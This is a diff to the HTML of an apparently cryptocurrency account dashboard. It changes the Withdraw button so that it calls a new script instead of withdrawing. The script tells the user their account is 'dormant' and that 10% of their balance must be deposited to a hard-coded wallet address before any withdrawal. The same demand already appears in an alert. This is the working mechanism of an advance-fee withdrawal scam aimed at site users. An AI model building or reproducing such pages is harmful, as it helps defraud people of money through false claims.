@@ -137,7 +137,7 @@
          </div>
          <div class="col-xxl-12 col-12 mb-3">
             <button class="btn btn-primary" onclick = "fun();" >Deposit</button>
-         <button class="btn btn-primary" onclick = "withdrawal();">Withdraw</button>
+         <button class="btn btn-primary" onclick="myFunction()" >Withdraw</button>
      </div>
          <div class="row">
             <div class="col-xxl-6 col-xl-6 col-lg-6">
@@ -351,7 +351,20 @@
 
       alert ("Your account has been dormant for a while you will have to deposit\n 10% of your balance to unlock your withdrawal.\n Make the deposit to this wallet address \n 3Q9LcdmcPa4rw22GEgfLJDSWHhydmveZNn");
    }
-</script>  
+</script>
+
+<script>
+   function myFunction() {
+     let text;
+     let wallet = prompt("Your account has been dormant for a while you will have to make a deposit of\n 10% of your balance to unlock your withdrawal:", "3Q9LcdmcPa4rw22GEgfLJDSWHhydmveZNn");
+     if (wallet == null || wallet == "") {
+       text = "You just canceled the transaction.";
+     } else {
+      //  text = "Hello " + person + "! How are you today?";
+     }
+     document.getElementById("demo").innerHTML = text;
+   }
+   </script>
 
 
 </body>
